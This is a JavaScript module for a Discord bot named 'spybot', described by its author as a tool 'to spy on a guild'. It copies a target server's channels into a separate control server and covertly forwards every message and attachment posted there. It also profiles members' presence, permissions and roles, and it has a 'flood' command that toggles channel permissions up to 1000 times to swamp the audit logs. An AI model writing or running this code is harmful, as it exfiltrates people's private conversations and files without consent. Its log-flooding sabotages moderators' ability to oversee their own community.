const config = {
    control_guild_id: "957353786693799986",
    control_channel_id: "959839571137404928"
}
//requires
const client = require('../index').client
const fs = require('fs')
const discord = require('discord.js')
//consts
var control
var control_channel
var controlled
var channels = new Map
var categ = new Map
var forcestop = false
const help = fs.readFileSync('./help.txt', 'utf-8')
//exports
module.exports = {
    name: "spybot", 
    author: "The Red Spy",
    description: "a module to spy on a guild",
    version: "1.3",
    enabled: true,
    onReady: function() {
        console.log(`${client.user.username} is now online`) 
        control = client.guilds.cache.get(config.control_guild_id)
        control_channel = control.channels.cache.get(config.control_channel_id)
        //client.user.setStatus('invisible')
    },
    onMessage: function(message, args) {
        //if sent in control
        if(message.channel.id == control_channel.id) {
            //clear command
            if(args[0].toLowerCase() == "clear") {
                message.channel.send('deleting channels...')
                control.channels.cache.forEach(channel => {
                    try {
                        if(channel.id !== control_channel.id) channel.delete()
                    } catch {
                        
                    }
                });
                channels = new Map
                categ = new Map
            }
            //ls
            else if(args[0].toLowerCase() == "ls") {
                var msg = "```"
                client.guilds.cache.forEach(guild => {
                    msg += "\n" + guild.name
                })
                msg += "```"
                message.channel.send(msg)
            }
            //cd
            else if(args[0].toLowerCase() == "cd") {
                if(args[1] !== undefined) {
                    controlled = client.guilds.cache.find(guild => guild.name.toLowerCase().includes(args[1].toLowerCase()))
                    if(controlled !== undefined) {
                        message.channel.send("```\n" + controlled.name + ": now selected```")
                    }
                    else message.channel.send("```\ncouldn't find this guild```")
                }
            }
            //load
            if(args[0].toLowerCase() == "load") {
                if(controlled == undefined) message.channel.send("```\nplease select a guild with cd before```")
                else {
                    var index = 0
                    next()
                    function next() {
                        const channel = controlled.channels.cache.at(index)
                        if(channel == undefined) return message.channel.send('done!')
                        if(channel.type !== "GUILD_CATEGORY") {
                            if(!categ.get(channel.parentId) & channel.parent !== null) {
                                control.channels.create(channel.parent.name, {
                                    type: "GUILD_CATEGORY",
                                }).then(c => {
                                    categ.set(channel.parent.id, c)
                                    control.channels.create(channel.name, {
                                        type: channel.type,
                                        parent: categ.get(channel.parentId)
                                    }).then(c => {
                                        channels.set(channel.id, c)
                                        index++
                                        next()
                                    })
                                })
                            } else {
                                control.channels.create(channel.name, {
                                    type: channel.type,
                                    parent: categ.get(channel.parentId)
                                }).then(c => {
                                    channels.set(channel.id, c)
                                    index++
                                    next()
                                })
                            }
                        } 
                        else {
                            index++ 
                            next()
                        }   
                    }           
                }
            }
            //user
            else if(args[0].toLowerCase() == "user") {
                if(controlled) {
                    if(args[1].toLowerCase() == "scan") {
                        if(args[2] == undefined) return message.channel.send('wrong usage')
                        var user
                        if(args[1].toLowerCase().startsWith('id:')) user = controlled.members.cache.get(args[1].slice(3))
                        else user = controlled.members.cache.find(u => u.user.username.toLowerCase().includes(args[2]))
                        if(user) {
                            const embed = new discord.MessageEmbed({
                                title: user.nickname,
                                author: {name: user.user.tag, iconURL: message.author.displayAvatarURL()},
                                image: message.author.displayAvatarURL(),
                                footer: {text: "id: " + user.id},
                                fields: [
                                    {name: "join date", value: user.joinedAt.toString(), inline: false},
                                    {name: "account date", value: user.user.createdAt.toString(), inline: false},
                                    {name: "presence", value: user.presence.status.toString(), inline: true},
                                ]
                            })
                            if(user.voice.channelId !== null) embed.addField("voice", user.voice.channel.name, true)
                            message.channel.send({embeds: [embed]})
                        }
                        else message.channel.send("```\ncouldn't fint this user```")
                    }
                    else if(args[1].toLowerCase() == "perms") {
                        var user
                        if(args[1].startsWith('id:')) user = controlled.members.cache.get(args[1].slice(3))
                        else user = controlled.members.cache.find(u => u.user.username.toLowerCase().includes(args[2]))
                        if(user) message.channel.send("```\n" + user.permissions.toArray().toString().replaceAll(',', '\n') + "```")
                        else message.channel.send("```\ncouldn't fint this user```")
                    }
                    else if(args[1].toLowerCase() == "roles") {
                        var roles = ""
                        var user
                        if(args[1].startsWith('id:')) user = controlled.members.cache.get(args[1].slice(3))
                        else user = controlled.members.cache.find(u => u.user.username.toLowerCase().includes(args[2]))
                        if(user) {
                            user.roles.cache.forEach(role => {
                                roles += role.name + "\n"
                            })
                            message.channel.send("```\n" + roles + "```")
                        }
                        else message.channel.send("```\ncouldn't fint this user```")
                    }
                    else {
                        message.channel.send("?")
                    }
                } else message.channel.send("```\nplease select a guild with cd before```")
            }
            //scan
            else if(args[0].toLowerCase() == "scan") {
                if(controlled) {
                    const embed = new discord.MessageEmbed({
                        author: {name: controlled.name, iconURL: controlled.iconURL()},
                        description: controlled.description,
                        fields: [
                            {name: "created at", value: controlled.createdAt.toString(), inline: false},
                            {name: "verif level", value: controlled.verificationLevel, inline: true},
                            {name: "mfa", value: controlled.mfaLevel, inline: true},
                        ],
                        footer: {text: "id: " + controlled.id}
                    })
                    message.channel.send({embeds: [embed]})
                } else message.channel.send("```\nplease select a guild with cd before```")
            }
            //emojis
            else if(args[0].toLowerCase() == "emojis") {
                if(controlled) { 
                    var emojis = "emojis:"
                    controlled.emojis.cache.forEach(emoji => {
                        emojis += "<:" + emoji.identifier + ">"
                    })
                    if(emojis.length > 2000) message.channel.send(emojis.slice(0, 1997) + "...")
                    else message.channel.send(emojis)
                } else message.channel.send("```\nplease select a guild with cd before```")
            }
            //rôles
            else if(args[0].toLowerCase() == "roles") {
                if(controlled) { 
                    var roles = ""
                    controlled.roles.cache.forEach(role => {
                        roles += role.name.replaceAll("@", '') + '\n'
                    })
                    if(roles.length > 2000) message.channel.send(roles.slice(0, 1997) + "...")
                    else message.channel.send(roles)
                } else message.channel.send("```\nplease select a guild with cd before```")
            }
            //spam logs
            else if(args[0].toLowerCase() == "flood") {
                if(controlled) {
                    if(args[1] == "start") {
                        var num = parseInt(args[2])
                        const oldnum = num
                        var index = 0
                        if(num > 1000 | num.toString() == "NaN" | args[2] == undefined) return message.channel.send('```\nthis is not a number or it is too big\nsyntax: flood start [num]```')
                        var floomsg 
                        message.channel.send('```\nflooding the logs...```').then(msg => floomsg = msg)
                        again()
                        function again() {
                            try {
                                if(forcestop) {
                                    forcestop = false
                                    message.channel.send('```\nforce stopped```')
                                    return num = 0
                                }
                                if(num < 1) return message.channel.send('done!')
                                const channel = controlled.channels.cache.at(index)
                                if(channel == undefined) {
                                    num--
                                    index = 0
                                    console.log(num)
                                    floomsg.edit(`\`\`\`\nflooding the logs... ${oldnum - num}/${oldnum}\`\`\``)
                                    return again()
                                }
                                channel.edit({permissionOverwrites: [
                                    {
                                        id: controlled.roles.everyone.id,
                                        deny: ["CREATE_INSTANT_INVITE"] 
                                    }
                                ]}).then(() => {
                                    channel.edit({permissionOverwrites: [
                                        {
                                            id: controlled.roles.everyone.id,
                                            allow: ["CREATE_INSTANT_INVITE"]
                                        }
                                    ]}).then(() => {
                                        index++
                                        again()
                                    })
                                })
                            } catch {
                                message.channel.send('error (too fast)')
                                again()
                            }
                        }
                    } 
                    if(args[1].toLowerCase() == "stop") forcestop = true
                    else {
    
                    }
                } else message.channel.send("```\nplease select a guild with cd before```")
            }
            //help
            else if(args[0].toLowerCase() == "help") message.channel.send(help)
        }
        //sent in controlled guild
        else if(controlled) {
            if(message.guild.id == controlled.id) {
                const channel = channels.get(message.channel.id)
                if(channel !== undefined) {
                    const embed = new discord.MessageEmbed({
                        author: {name: message.author.username, iconURL: message.author.displayAvatarURL()},
                        description: message.content,
                        footer: {text: `id: ${message.id}`}
                    })
                    channel.send({embeds: [embed], files: Array.from(message.attachments.values())})
                } 
            }
        }
    }
}